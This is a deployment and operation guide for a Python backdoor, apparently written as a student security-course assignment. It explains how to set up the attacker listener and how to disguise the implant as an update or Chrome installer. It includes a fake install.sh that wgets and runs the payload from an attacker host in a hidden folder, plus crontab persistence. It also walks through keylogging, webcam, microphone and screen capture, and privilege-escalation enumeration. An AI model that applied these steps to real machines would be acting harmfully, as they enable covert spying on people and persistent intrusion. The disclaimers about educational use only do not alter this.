# Implementation Guide - Step by Step

This guide provides detailed instructions for implementing and testing the backdoor in a controlled environment.

## 🎯 Lab Setup

### Recommended Test Environment

**Option 1: Virtual Machines (Recommended)**

- Attacker: Kali Linux VM or any Linux/macOS
- Target: Ubuntu VM, Windows VM, or macOS VM
- Network: Host-only or NAT network

**Option 2: Docker Containers**

```bash
# Create isolated network
docker network create backdoor-lab

# Run attacker container
docker run -it --network backdoor-lab --name attacker python:3.9 /bin/bash

# Run target container
docker run -it --network backdoor-lab --name target python:3.9 /bin/bash
```

**Option 3: Physical Machines (Same Network)**

- Two separate machines on same WiFi/LAN
- Ensure firewall allows connection

## 📦 Step-by-Step Deployment

### Phase 1: Preparation

#### 1.1 Set Up Attacker Machine

```bash
# Navigate to desktop
cd ~/Desktop

# Create project directory if not exists
mkdir -p DES484_Backdoor
cd DES484_Backdoor

# Verify all files are present
ls -la
# Should see: backdoor.py, server.py, features/, logs/, requirements.txt, README.md

# Check Python version (must be 3.6+)
python3 --version

# Find your IP address
# Linux/macOS:
ip addr show | grep inet
# or
ifconfig | grep inet

# Note your IP address, e.g., 192.168.1.12
```

#### 1.2 Install Required Libraries

**Install dependencies from requirements.txt:**

```bash
# Make sure you're in the project directory
cd ~/Desktop/DES484_Backdoor

# Install all required libraries
pip3 install -r requirements.txt
```

**What gets installed:**

- `pynput` - For keylogger functionality
- `Pillow` - For screenshot capture
- `pyautogui` - For screen automation
- `pyaudio` - For audio recording
- `opencv-python` - For webcam capture

**Note:** If you're building executables, the `build_executable.py` script will automatically install these requirements for you.

**Troubleshooting installation issues:**

```bash
# If pip3 is not found, try:
python3 -m pip install -r requirements.txt

# For macOS users - install pyaudio dependencies first:
brew install portaudio
pip3 install -r requirements.txt

# For Linux users - install system dependencies:
sudo apt-get update
sudo apt-get install -y python3-pip portaudio19-dev python3-pyaudio
pip3 install -r requirements.txt

# For other Linux distributions:
# Fedora/CentOS/RHEL:
sudo dnf install portaudio-devel
# Arch Linux:
sudo pacman -S portaudio

# If pyaudio installation still fails after installing portaudio19-dev:
# You can skip it and use fallback methods for audio recording
pip3 install pynput Pillow pyautogui opencv-python
# Audio recording will work using system commands (arecord, sox, etc.)

# For individual package installation (if needed):
pip3 install pynput              # Keylogger
pip3 install Pillow pyautogui    # Screenshots
pip3 install pyaudio             # Audio recording (requires portaudio system library)
pip3 install opencv-python       # Webcam capture
```

#### 1.3 Prepare Target Package

**Full Package (with all features):**

```bash
# Create deployment package
cd ~/Desktop
tar -czf backdoor_full.tar.gz DES484_Backdoor/

# Or create zip
zip -r backdoor_full.zip DES484_Backdoor/
```

### Phase 2: Configuration

#### 2.1 Configure Attacker (backdoor.py)

The backdoor.py is already configured to listen on all interfaces (0.0.0.0).
No changes needed unless you want a different port:

```python
# In backdoor.py (already configured):
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 5555       # Default port
```

#### 2.2 Configure Target (server.py)

**Edit server.py and update these lines:**

```python
# At the bottom of server.py (around line 490)
if __name__ == "__main__":
    # Configuration - Change these to match your attacker machine
    ATTACKER_HOST = '192.168.1.12'  # ← Change to YOUR attacker IP
    ATTACKER_PORT = 5555            # ← Change if needed

    # Create and start backdoor client
    client = BackdoorClient(ATTACKER_HOST, ATTACKER_PORT)
    client.connection()
```

**Finding the right IP:**

```bash
# On attacker machine:
# For VMs in same network:
ip addr show eth0        # Or eth1, wlan0, etc.

# For physical machines:
ifconfig                 # Look for your active interface

# For Docker:
docker inspect backdoor-lab | grep Gateway
```

### Phase 3: Deployment Methods

#### Method A: Direct Transfer (Same Network)

**Using SCP:**

```bash
# From attacker machine
scp -r DES484_Backdoor/ user@target_ip:/tmp/

# Example:
scp -r DES484_Backdoor/ alice@192.168.1.50:/tmp/
```

**Using HTTP Server:**

```bash
# On attacker:
cd ~/Desktop
python3 -m http.server 8000

# On target:
# If you have wget installed:
wget http://192.168.1.12:8000/backdoor_full.tar.gz
# If wget is not available (zsh: command not found), use curl (installed by default on macOS/Linux):
curl -O http://192.168.1.12:8000/backdoor_full.tar.gz
# Or install wget:
#  - macOS (Homebrew): brew install wget
#  - Debian/Ubuntu: sudo apt update && sudo apt install -y wget
#  - Fedora/CentOS: sudo dnf install -y wget
tar -xzf backdoor_full.tar.gz
cd DES484_Backdoor/
```

**Using USB/Shared Folder (VMs):**

```bash
# Copy to shared folder
cp -r DES484_Backdoor/ /mnt/shared/

# On target VM:
cp -r /mnt/shared/DES484_Backdoor /tmp/
```

#### Method B: Social Engineering Simulation

**Disguise the backdoor:**

```bash
# Rename to look legitimate
mv server.py system_update.py
# or
mv server.py chrome_installer.py

# Create wrapper script
cat > update.sh << 'EOF'
#!/bin/bash
echo "Installing system updates..."
python3 system_update.py &
echo "Update complete!"
EOF
chmod +x update.sh
```

#### Method C: Exploit Simulation

**Simulate web exploit:**

```bash
# Create fake installer
cat > install.sh << 'EOF'
#!/bin/bash
echo "Installing required packages..."
cd /tmp
mkdir -p .system
cd .system
# Download backdoor (from your server)
wget http://attacker-ip:8000/server.py
wget http://attacker-ip:8000/features.tar.gz
tar -xzf features.tar.gz
python3 server.py &
EOF
```

### Phase 4: Execution

#### 4.1 Start Attacker Listener

```bash
# On attacker machine
cd ~/Desktop/DES484_Backdoor
python3 backdoor.py

# You should see:
# ╔═══════════════════════════════════════════════════════════════╗
# ║           Enhanced Backdoor Controller v2.0                   ║
# ║              For Educational Purposes Only!                   ║
# ║                  DES484 - SIIT 2024                          ║
# ╚═══════════════════════════════════════════════════════════════╝
#
# [+] Listening on 0.0.0.0:5555
# [*] Waiting for incoming connections...
```

#### 4.2 Execute Backdoor on Target

**Option 1: Direct execution:**

```bash
# On target machine
cd /tmp/DES484_Backdoor
python3 server.py

# You should see:
# [*] Attempting to connect to 192.168.1.12:5555...
# [+] Connection established!
```

**Option 2: Background execution:**

```bash
# Run in background
nohup python3 server.py > /dev/null 2>&1 &

# Or with systemd (Linux)
python3 server.py &
disown
```

**Option 3: Scheduled execution:**

```bash
# Add to crontab (runs every reboot)
(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/DES484_Backdoor/server.py") | crontab -
```

#### 4.3 Verify Connection

On attacker machine, you should see:

```
[+] Connection established from 192.168.1.50:54321

=== System Information ===
Hostname: target-machine
System: Linux
Release: 5.15.0
...
```

### Phase 5: Testing Features

#### Test Basic Commands

```
help
```

Response: Shows a list of all available commands and their descriptions

```
sysinfo
```

Response: Displays system information (hostname, OS, release, architecture)

```
pwd
```

Response: Prints the current working directory

```
whoami
```

Response: Shows the current user

```
ls -la
```

Response: Lists files and directories in the current directory with details

##### How It Works

1. **help**: Lists all available commands and their usage
2. **sysinfo**: Gathers and displays system information
3. **pwd**: Returns the present working directory
4. **whoami**: Returns the username of the current user
5. **ls -la**: Lists all files (including hidden) with permissions and metadata

##### Output Example

```
Available commands:
    help, sysinfo, pwd, whoami, ls, cd, download, upload, ...

System Information:
    Hostname: target-machine
    System: Linux
    Release: 5.15.0
    Architecture: x86_64

/tmp/DES484_Backdoor

user

total 64
drwxr-xr-x  6 user user  4096 Oct  3 14:00 .
drwxrwxrwt 20 root root  4096 Oct  3 13:59 ..
-rw-r--r--  1 user user  1234 Oct  3 14:00 backdoor.py
... (other files)
```

#### Keylogger

```
keylog_start
```

Response: "Keylogger started successfully"

##### Check Status

```
keylog_status
```

Shows:

- Running status
- Log file path
- Buffer size
- File size

##### View Captured Keystrokes

```
keylog_dump
```

Displays all captured keystrokes with timestamps

##### Stop Keylogger

```
keylog_stop
```

Stops the keylogger and saves any remaining logs

##### Clear Logs

```
keylog_clear
```

Deletes the log file and clears the buffer

##### How It Works

###### Key Capture Logic

1. **Regular Keys**: Letters, numbers, symbols are logged as-is
2. **Space**: Logged as a space character
3. **Enter**: Creates a new line and triggers auto-save
4. **Tab**: Logged as a tab character
5. **Backspace**: Removes the last character from buffer
6. **Other Special Keys**: Logged in brackets, e.g., `[SHIFT]`, `[CTRL]`

###### Auto-Save Mechanism

- Saves automatically every 50 keystrokes
- Saves when Enter key is pressed
- Saves when keylogger is stopped
- Each entry includes a timestamp

###### Log File Format

```
[2025-10-03 14:30:22] Hello World
[2025-10-03 14:30:45] This is a test
[2025-10-03 14:31:10] password123[ENTER]
```

#### Test Privilege Escalation

```
priv_check
```

Response: Shows if running as admin/root

```
priv_enum
```

Response: Lists privilege escalation vectors and current privileges

```
priv_services
```

Response: Lists important services and their status

##### How It Works

1. **priv_check**: Checks if the process has elevated privileges (root/admin)
2. **priv_enum**: Enumerates possible privilege escalation vectors (e.g., SUID binaries, weak services)
3. **priv_services**: Lists critical system services and their privilege level

##### Output Example

```
[+] Privilege: root
[+] SUID Binaries: /usr/bin/passwd, /usr/bin/sudo
[+] Services: sshd (root), cups (user)
```

#### Test Screen Capture

```
screenshot_multi 5 2
```

Takes 5 screenshots at 2-second intervals and saves them with timestamps.

Response: Multiple screenshots saved with sequential filenames.

##### How It Works

1. **screenshot_multi N T**: Captures N screenshots, waiting T seconds between each capture. All images are saved in logs/screenshots/ with unique timestamps.
2. Useful for monitoring screen activity over a period of time.

##### Output Example

```
[+] Screenshot saved: logs/screenshots/screenshot_20251003_150000.png
[+] Screenshot saved: logs/screenshots/screenshot_20251003_150002.png
[+] Screenshot saved: logs/screenshots/screenshot_20251003_150004.png
[+] Screenshot saved: logs/screenshots/screenshot_20251003_150006.png
[+] Screenshot saved: logs/screenshots/screenshot_20251003_150008.png
Available screenshots:
- screenshot_20251003_150000.png
- screenshot_20251003_150002.png
- screenshot_20251003_150004.png
- screenshot_20251003_150006.png
- screenshot_20251003_150008.png
```

```
screenshot
```

Response: Screenshot saved with timestamp

```
screenshot_list
```

Shows: List of all captured screenshots with filenames

```
download logs/screenshots/screenshot_YYYYMMDD_HHMMSS.png
```

Downloads the specified screenshot

##### How It Works

1. **Screenshot Capture**: Captures the current screen and saves as PNG in logs/screenshots/
2. **Listing**: Shows all screenshots available for download
3. **Download**: Allows retrieval of any screenshot file

##### Output Example

```
[+] Screenshot saved: logs/screenshots/screenshot_20251003_143000.png
Available screenshots:
- screenshot_20251003_143000.png
- screenshot_20241002_120000.png
```

#### Test Webcam Capture

```
webcam_snap
```

Response: Webcam image saved with timestamp

```
ls logs/webcam/
```

Shows: List of all captured webcam images

```
download logs/webcam/webcam_YYYYMMDD_HHMMSS.jpg
```

Downloads the specified webcam image

##### How It Works

1. **Webcam Capture**: Takes a snapshot from the webcam and saves as JPG in logs/webcam/
2. **Listing**: Shows all webcam images available for download
3. **Download**: Allows retrieval of any webcam image file

##### Output Example

```
[+] Webcam image saved: logs/webcam/webcam_20251003_144500.jpg
Available webcam images:
- webcam_20251003_144500.jpg
- webcam_20241002_150000.jpg
```

#### Test Audio Recording

```
audio_record 10
```

Response: Records 10 seconds of audio from microphone and saves as WAV

```
audio_list
```

Shows: List of all recorded audio files

```
download logs/audio/audio_YYYYMMDD_HHMMSS.wav
```

Downloads the specified audio file

##### How It Works

1. **Audio Recording**: Records audio from the microphone for the specified duration and saves as WAV in logs/audio/
2. **Listing**: Shows all audio recordings available for download
3. **Download**: Allows retrieval of any audio file

##### Output Example

```
[+] Audio recorded: logs/audio/audio_20251003_145000.wav
Available audio files:
- audio_20251003_145000.wav
- audio_20241002_150030.wav
```

#### Test Persistence

```
persist_check
```

Response: Shows if persistence is installed and method used

```
persist_install
```

Response: Installs persistence (e.g., crontab, LaunchAgent, registry)

```
persist_remove
```

Response: Removes persistence and cleans up

##### How It Works

1. **Check**: Detects if persistence is active and which method is used
2. **Install**: Adds the backdoor to system startup (crontab, LaunchAgent, registry, etc.)
3. **Remove**: Deletes persistence entry and verifies removal

##### Output Example

```
[+] Persistence installed: crontab @reboot
[+] Persistence removed successfully
```

#### Test Network Discovery

```
net_info
```

Response: Shows local network interfaces and IP addresses

```
net_scan
```

Response: Scans local network for active hosts

```
net_connections
```

Response: Lists current network connections

```
net_public_ip
```

Response: Shows public IP address of the target

##### How It Works

1. **net_info**: Gathers local network interface and IP information
2. **net_scan**: Scans subnet for live hosts (ping sweep or ARP)
3. **net_connections**: Lists open TCP/UDP connections
4. **net_public_ip**: Retrieves public IP via external service

##### Output Example

```
[+] Interfaces: eth0 192.168.1.50, wlan0 192.168.1.51
[+] Live hosts: 192.168.1.1, 192.168.1.12, 192.168.1.50
[+] Connections: 192.168.1.50:5555 -> 192.168.1.12:5555
[+] Public IP: 203.0.113.45
```

### Phase 6: Cleanup

#### On Target Machine

```bash
# Stop the backdoor
[192.168.1.50]> quit

# On target, clean up files
rm -rf /tmp/DES484_Backdoor
rm -rf /tmp/.system

# Remove persistence
python3 -c "from features.persistence import Persistence; p = Persistence(); print(p.remove_persistence())"

# Or manually:
# Linux: Check crontab and systemd
crontab -l
systemctl --user list-units | grep system

# macOS: Check launch agents
ls ~/Library/LaunchAgents/

# Windows: Check registry and startup folder
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### On Attacker Machine

```bash
# Remove downloaded files
rm -f *.txt *.log *.png *.wav *.jpg

# Or keep for evidence/analysis
mkdir -p evidence/
mv logs/ evidence/
```

## 🔍 Troubleshooting Common Issues

### Issue 1: Connection Refused

```bash
# Check if listener is running
netstat -an | grep 5555

# Check firewall
sudo ufw status                    # Linux
sudo firewall-cmd --list-all       # CentOS/RHEL

# Allow port
sudo ufw allow 5555/tcp
```

### Issue 2: Feature Import Errors

```bash
# Install all dependencies at once
pip3 install -r requirements.txt

# Or on target machine
cd /tmp/DES484_Backdoor
pip3 install -r requirements.txt

# Or use without dependencies
# Features will use fallback methods automatically
```

**Note:** The `build_executable.py` script automatically installs requirements when building executables, so this is mainly for running the Python script directly.

### Issue 3: Wrong IP Address

```bash
# Find correct interface
ip route get 1.1.1.1 | awk '{print $7}'

# Or list all interfaces
ip addr show
```

### Issue 4: Permission Denied

```bash
# Run with appropriate permissions
sudo python3 server.py

# Or use privilege escalation features
priv_enum
```

### Issue 5: Keylogger Not Working

```bash
# Install pynput
pip3 install pynput

# Or run with proper display permissions
export DISPLAY=:0
python3 server.py

# macOS: Grant accessibility permissions
# System Preferences > Security & Privacy > Privacy > Accessibility
```

### Issue 6: Webcam Not Working

```bash
# Install opencv-python
pip3 install opencv-python

# Linux: Check webcam permissions
ls -l /dev/video*
sudo usermod -a -G video $USER

# macOS: Grant camera permissions
# System Preferences > Security & Privacy > Privacy > Camera
# Add Terminal or Python to allowed apps

# Test webcam manually
python3 -c "import cv2; cam = cv2.VideoCapture(0); print('Webcam OK' if cam.isOpened() else 'Failed')"
```

### Issue 7: Audio Recording Not Working

```bash
# For macOS - install PortAudio first:
brew install portaudio
pip3 install pyaudio

# For Linux (Ubuntu/Debian) - install system dependencies:
sudo apt-get update
sudo apt-get install -y portaudio19-dev
pip3 install pyaudio

# For other Linux distributions:
# Fedora/CentOS/RHEL:
sudo dnf install portaudio-devel
pip3 install pyaudio

# Arch Linux:
sudo pacman -S portaudio
pip3 install pyaudio

# If pyaudio installation still fails:
# Error: "portaudio.h: No such file or directory"
# Solution: Install portaudio19-dev package first (see above)

# Alternative: Skip pyaudio and use fallback methods
# The audio recording feature will automatically use system commands
# like 'arecord' (Linux) or 'sox' as fallback

# macOS: Grant microphone permissions
# System Preferences > Security & Privacy > Privacy > Microphone

# Linux: Test microphone
arecord -d 3 test.wav && aplay test.wav

# Check if microphone is detected:
arecord -l  # List all capture devices
```

## 📊 Testing Checklist

- [ ] Attacker listener starts successfully
- [ ] Target connects to attacker
- [ ] System information displays correctly
- [ ] Basic shell commands work
- [ ] File download works
- [ ] File upload works
- [ ] Keylogger starts and captures keystrokes
- [ ] Privilege escalation enumeration works
- [ ] Screenshot capture works
- [ ] Webcam capture works
- [ ] Audio recording works
- [ ] Network discovery functions
- [ ] Persistence installation works
- [ ] Help commands display properly
- [ ] Connection persists after disconnect
- [ ] Cleanup removes all traces

## 🎓 Demo Presentation Tips

For your class presentation:

1. **Start with setup slide** - Show architecture diagram
2. **Demonstrate basic features** - Connection, shell commands
3. **Showcase keylogger** - Type in notepad, show capture
4. **Show privilege escalation** - Enumerate vectors
5. **Demonstrate screen capture** - Take and download screenshot
6. **Network discovery demo** - Scan network, find hosts
7. **Persistence demo** - Install, reboot, reconnect
8. **Discuss detections** - How it could be detected
9. **Show cleanup** - Remove all traces
10. **Ethical considerations** - Legal usage only

## 🔐 Security Notes

Remember:

- Always test in isolated environment
- Never use on production systems without authorization
- Document all testing activities
- Follow your institution's ethical guidelines
- Get written permission for any testing

---

**Good luck with your assignment! Learn responsibly! 🎓**
